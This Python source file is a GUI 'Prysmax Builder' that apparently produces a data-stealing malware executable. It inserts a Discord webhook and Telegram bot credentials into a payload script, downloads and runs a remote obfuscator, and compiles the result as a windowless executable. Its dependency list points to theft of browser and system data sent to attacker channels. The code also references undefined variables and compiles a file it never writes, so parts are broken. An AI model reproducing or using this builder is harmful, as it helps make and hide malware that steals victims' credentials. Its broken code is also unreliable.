import os
import subprocess
import customtkinter as ctk
from tkinter import messagebox
import http.cookiejar
import sys
import urllib.parse
import urllib.request
import requests
import json
from http.cookies import SimpleCookie
from json import loads as json_loads, load as json_load

import argparse

_headers = {"Referer": 'https://rentry.co'}

def load_languages():
    with open('config.json', 'r', encoding='utf-8') as file:
        return json_load(file)
def set_language(language, languages, widgets):
    lang_data = languages['languages'][language]
    widgets['title_label'].configure(text=lang_data['title'])
    widgets['webhook_label'].configure(text=lang_data['webhook_label'])
    widgets['bot_token_label'].configure(text=lang_data['bot_token_label'])
    widgets['chat_id_label'].configure(text=lang_data['chat_id_label'])
    widgets['download_button'].configure(text=lang_data.get('send_discord', "Send to Discord"))
    widgets['compile_button'].configure(text=lang_data.get('send_telegram', "Send to Telegram"))
    widgets['exit_button'].configure(text=lang_data.get('send_both', "Send to Both"))
    widgets['change_language_label'].configure(text=lang_data.get('restart_language', "Restart Language"))
 
    
def load_languages_from_file():
    with open('config.json', 'r', encoding='utf-8') as file:
        return json.load(file)

class UrllibClient:

    def __init__(self):
        self.cookie_jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.cookie_jar))
        urllib.request.install_opener(self.opener)

    def get(self, url, headers={}):
        request = urllib.request.Request(url, headers=headers)
        return self._request(request)

    def post(self, url, data=None, headers={}):
        postdata = urllib.parse.urlencode(data).encode()
        request = urllib.request.Request(url, postdata, headers)
        return self._request(request)

    def _request(self, request):
        response = self.opener.open(request)
        response.status_code = response.getcode()
        response.data = response.read().decode('utf-8')
        return response

def new(url, edit_code, text):
    client, cookie = UrllibClient(), SimpleCookie()

    cookie.load(vars(client.get('https://rentry.co'))['headers']['Set-Cookie'])
    csrftoken = cookie['csrftoken'].value

    payload = {
        'csrfmiddlewaretoken': csrftoken,
        'url': url,
        'edit_code': edit_code,
        'text': text
    }

    return json_loads(client.post('https://rentry.co/api/new', payload, headers=_headers).data)

def get_rentry_link(text):
    url, edit_code = '', ''

    response = new(url, edit_code, text)
    if response['status'] != '200':
        print('error: {}'.format(response['content']))
        try:
            for i in response['errors'].split('.'):
                i and print(i)
            sys.exit(1)
        except:
            sys.exit(1)
    else:
        pastebin_link = response['url']
        return pastebin_link

def install_and_import(library):
    try:
        __import__(library)
    except ImportError:
        print(f"{library} Installing...")
        subprocess.check_call(['pip', 'install', library])

install_and_import('customtkinter')


def download_libraries():
    required_libraries = [
        'requests', 'json', 'base64', 'sqlite3', 'shutil', 'uuid', 'wmi', 'psutil',
        'subprocess', 'pyarmor==7.6.1', 'pyinstaller', 'glob', 're', 'platform', 'Pillow', 
        'zipfile', 'discord-webhook', 'pycryptodomex', 'pycryptodome', 'datetime', 'pywin32',
    ]

    for library in required_libraries:
        try:
            __import__(library)
        except ImportError:
            print(f"{library} not found. Downloading...")
            subprocess.check_call(['pip', 'install', library])

def compile_and_explore(webhook_url, bot_token=None, chat_id=None):
    if not os.path.exists("prysmax1builder"):
        os.makedirs("prysmax1builder")

    with open("main.py", 'r', encoding='utf-8') as main_file:
        main_content = main_file.read()

    if webhook_url:
        main_content = main_content.replace('theapi2023 = "Here-Token"', f'theapi2023 = "{webhook_url}"')
    if bot_token:
        main_content = main_content.replace('bot_token = "here-your-telegram"', f'bot_token = "{bot_token}"')
    if chat_id:
        main_content = main_content.replace('chat_id = "here-your-chat-id"', f'chat_id = "{chat_id}"')

    file_path = os.path.join("prysmax1builder", "main.py")
    with open(file_path, 'w', encoding='utf-8') as new_main_file:
        new_main_file.write(main_content)

    obf_file_path = os.path.join("obf.py")
    a = requests.get("https://raw.githubusercontent.com/Lawxsz/py-obfuscator/main/obf.py")
    with open(obf_file_path, "w", encoding='utf-8') as file:
        file.write(a.text)

    obfuscated_file_path = os.path.join("prysmax1builder", "Obfuscated_main.py")
    subprocess.run(['python', obf_file_path, file_path, '-o', obfuscated_file_path])


    with open(obfuscated_file_path, 'w', encoding='utf-8') as final_file:
        final_file.write(final_script)


    print(f"Final script created at: {final_file_path}")
    languages = load_languages_from_file()
    current_language = "English"
    # Compilation process
    here = messagebox.askyesno(
    languages['languages'][current_language]['confirm_compilation'],
    languages['languages'][current_language]['confirm_compilation']
)
    if here:
        print("Compiling...")
        try:
            subprocess.run('pyinstaller "--onefile --noconsole --icon=NONE" prysmax1builder\\prysmax.py', shell=True)
        except:
            subprocess.run('pyinstaller "--onefile --noconsole --icon=NONE" prysmax1builder\\prysmax.py', shell=True)

        print("File successfully compiled!")
        subprocess.run("explorer prysmax1builder\\dist", shell=True)
    else:
        print("Compilation canceled.")
def main():
    languages = load_languages_from_file()
    current_language = "English"  # Idioma por defecto

    root = ctk.CTk()
    root.title("Prysmax Builder")
    root.geometry("600x650")
    root.configure(bg="#1f1f1f")  # Fondo oscuro

    selected_service = ctk.StringVar(value="Discord")  # Valor por defecto

    ctk.set_appearance_mode("dark")  # Modo oscuro
    ctk.set_default_color_theme("blue")  # Color por defecto

    # Frame contenedor decorado
    frame = ctk.CTkFrame(root, corner_radius=15)
    frame.pack(pady=20, padx=20, fill="both", expand=True)

    # Widgets de la interfaz
    widgets = {}

    # Título decorado
    widgets['title_label'] = ctk.CTkLabel(frame, text="", font=ctk.CTkFont(size=26, weight="bold"))
    widgets['title_label'].pack(pady=20)

    # Entrada para el Webhook
    widgets['webhook_label'] = ctk.CTkLabel(frame, text="")
    widgets['webhook_label'].pack(pady=10)
    webhook_url_entry = ctk.CTkEntry(frame, width=400, corner_radius=10)
    webhook_url_entry.pack(pady=10)

    # Entrada para el Token del Bot
    widgets['bot_token_label'] = ctk.CTkLabel(frame, text="")
    widgets['bot_token_label'].pack(pady=10)
    bot_token_entry = ctk.CTkEntry(frame, width=400, corner_radius=10)
    bot_token_entry.pack(pady=10)

    # Entrada para el Chat ID
    widgets['chat_id_label'] = ctk.CTkLabel(frame, text="")
    widgets['chat_id_label'].pack(pady=10)
    chat_id_entry = ctk.CTkEntry(frame, width=400, corner_radius=10)
    chat_id_entry.pack(pady=10)

    # Botón para descargar librerías
    widgets['download_button'] = ctk.CTkButton(frame, text="", command=download_libraries, width=150)
    widgets['download_button'].pack(pady=10)

    # Botón para compilar y explorar
    widgets['compile_button'] = ctk.CTkButton(frame, text="", command=lambda: compile_and_explore(
        webhook_url_entry.get(), bot_token_entry.get(), chat_id_entry.get()), width=150)
    widgets['compile_button'].pack(pady=10)

    # Botón de salir
    widgets['exit_button'] = ctk.CTkButton(frame, text="", command=root.quit, width=150, fg_color="red")
    widgets['exit_button'].pack(pady=10)

    # Etiqueta para cambiar de idioma
    widgets['change_language_label'] = ctk.CTkLabel(root, text="")
    widgets['change_language_label'].pack(pady=10)

    # Opción para seleccionar el idioma
    languages_list = list(languages['languages'].keys())
    selected_language = ctk.StringVar(value=current_language)

    def on_language_change(language):
        set_language(language, languages, widgets)

    language_menu = ctk.CTkOptionMenu(root, variable=selected_language, values=languages_list, command=on_language_change)
    language_menu.pack(pady=10)

    # Inicializar el idioma
    set_language(current_language, languages, widgets)

    root.mainloop()


if __name__ == '__main__':
    main()
